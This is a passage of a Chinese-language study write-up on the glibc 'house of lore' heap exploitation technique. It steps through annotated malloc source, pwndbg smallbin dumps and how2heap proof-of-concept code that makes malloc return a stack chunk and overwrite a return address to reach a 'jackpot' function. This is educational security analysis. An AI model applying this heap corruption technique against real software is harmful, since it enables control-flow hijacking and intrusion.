      bin = bin_at (av, idx);  //bin==0x7ffff7dcdda0

      if ((victim = last (bin)) != bin) //检查smallbin中是否有符合大小的free chunk
        {  //进入if语句:victim==0x555555757250
          bck = victim->bk;  //bck==0x7fffffffdca0（stack_buffer_1）
	  if (__glibc_unlikely (bck->fd != victim)) //检查双向链表的完整性
          	//bck->fd==0x555555757250
	    malloc_printerr ("malloc(): smallbin double linked list corrupted"); //未触发异常
===============================================================================================
pwndbg> smallbin
smallbins
0x110 [corrupted]
FD: 0x555555757250 —▸ 0x7ffff7dcdda0 (main_arena+352) ◂— 0x555555757250 /* 'PruUUU' */
BK: 0x555555757250 —▸ 0x7fffffffdca0 —▸ 0x7fffffffdc80 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdd20 ◂— ...
pwndbg> 
===============================================================================================
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck; //对smallbin中的victim进行解链【1】
          bck->fd = bin; //对smallbin中的victim进行解链【2】
-----------------------------------------------------------------------------------------------
smallbins
0x110 [corrupted]
FD: 0x555555757250 —▸ 0x7ffff7dcdda0 (main_arena+352) ◂— 0x555555757250 /* 'PruUUU' */
BK: 0x7fffffffdca0 —▸ 0x7fffffffdc80 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd40 ◂— ...
pwndbg> 
-----------------------------------------------------------------------------------------------
          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */ 
          //如果smallbin中的对应大小的链表中仍然有大小相同的free chunk
          //我们会将剩余的free chunk放入到对应的tcachebin链表中
	  size_t tc_idx = csize2tidx (nb); //tc_idx==15
	  if (tcache && tc_idx < mp_.tcache_bins) 
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count //检查对应大小的tcachebin链表是否未满
		     && (tc_victim = last (bin)) != bin) //检查对应大小的smallbin链表上是否仍有free chunk
		{
		  if (tc_victim != 0)
		    { //tc_victim==0x7fffffffdca0
#现在的smallbin链表：
#smallbins
#0x110 [corrupted]
#FD: 0x555555757250 —▸ 0x7ffff7dcdda0 (main_arena+352) ◂— 0x555555757250 /* 'PruUUU' */
#BK: 0x7fffffffdca0 —▸ 0x7fffffffdc80 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd40 ◂— ...
		      bck = tc_victim->bk; //bck==0x7fffffffdc80
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck; //对tc_victim进行解链【1】
		      bck->fd = bin; //对tc_victim进行解链【2】
#smallbins
#0x110 [corrupted]
#FD: 0x555555757250 —▸ 0x7ffff7dcdda0 (main_arena+352) ◂— 0x555555757250 /* 'PruUUU' */
#BK: 0x7fffffffdc80 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd40 —▸ 0x7fffffffdd60 ◂— ...
		      tcache_put (tc_victim, tc_idx); //放入tcachebin
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

循环之后效果如下：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620988759948-7860afbc-1c41-4081-a1a4-ee436def21b0.png)

上面的过程看起来可能有些懵，可以使用画图的形式来展现：

[house of lore.pptx](https://www.yuque.com/attachments/yuque/0/2021/pptx/574026/1621170008181-62e81311-6c3e-4a1b-9a65-e0d63af4c449.pptx)

> 看不懂的话建议阅读malloc源码及我之前的文章。
>

再次申请就可以控制stack上的堆块（b 130->c）（tcachebin的优先级最高）：

```c
  fprintf(stderr, "This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n");
  char *p4 = malloc(0x100);
  fprintf(stderr, "p4 = malloc(0x100)\n");

  fprintf(stderr, "\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n",
         stack_buffer_2[2]);

#This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
#p4 = malloc(0x100)
#The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fffffffdcb0
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1620988861068-3be2f9f0-b843-4db7-8b8c-d218bd2976e0.png)

接下来我们可以向b 135->c：

```c
  fprintf(stderr, "\np4 is %p and should be on the stack!\n", p4); // this chunk will be allocated on stack
  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
  memcpy((p4+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

  // sanity check
  assert((long)__builtin_return_address(0) == (long)jackpot); 
			//0x55555555598b==0x55555555586A
```

在执行上述代码之前这里再回顾一下p4里面有什么：

```python
pwndbg> x/16gx p4
0x7fffffffdd90:	0x00007fffffffdd70	0x0000000000000000
0x7fffffffdda0:	0x00007fffffffde08	0x00000000000000f0
0x7fffffffddb0:	0x007ffff7dcdda001	0x00007fffffffdd00 #0x000055555555486a
0x7fffffffddc0:	0x00007ffff7de3b40	0x0000000000000000
0x7fffffffddd0:	0x0000555555554fe0	0x0000000000000000
0x7fffffffdde0:	0x00007fffffffded0	0x43bb3559a8bd3300
0x7fffffffddf0:	0x0000555555554fe0	0x00007ffff7a03bf7
0x7fffffffde00:	0x0000000000000001	0x00007fffffffded8 
pwndbg> 
```

__builtin_return_address(0)得到当前函数返回地址，放在这里就是这个函数返回main函数的返回地址；这里代码的意思是我们将main函数的return地址覆盖为了jackpot，让main函数结束时调用jackpot，但是这个POC好像有点问题，会在执行assert时导致程序的段错误：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621174709365-0feb153e-bfa6-40b2-8a29-cebf3f1762bf.png)

# 联想&&注意
当我看完这种攻击方式之后我立刻想到了之前的一种攻击方式--fastbin reverse into tcache：

[how2heap(2)-fastbin_reverse_into_tcache](https://www.yuque.com/cyberangel/lc795f/ffl0sh)



同样的，这里也要注意堆块的伪造数量，我们来测试一下，将POC改为如下所示：

```python
  for(int i=0; i<4; i++) {
    fake_freelist[i][3] = fake_freelist[i+1];
  }
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621178324070-ded5926c-1174-424c-92b6-ff4ff714d592.png)

经过调试可以知道在执行bck->fd = bin;由于需要向0x7ffff7dd5661（dl_main）写入fd指针，但是ld-2.27.so是无法写入的（段属性），在写入时会造成段错误，这一点要注意。

# POC总结
直接一张图就行：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1621177370357-4aa92191-654c-426a-8d9a-9572aefd0a68.png)

将堆块直接伪造成如上图所示，我的感受就是这种攻击方式有点鸡肋还麻烦😂。



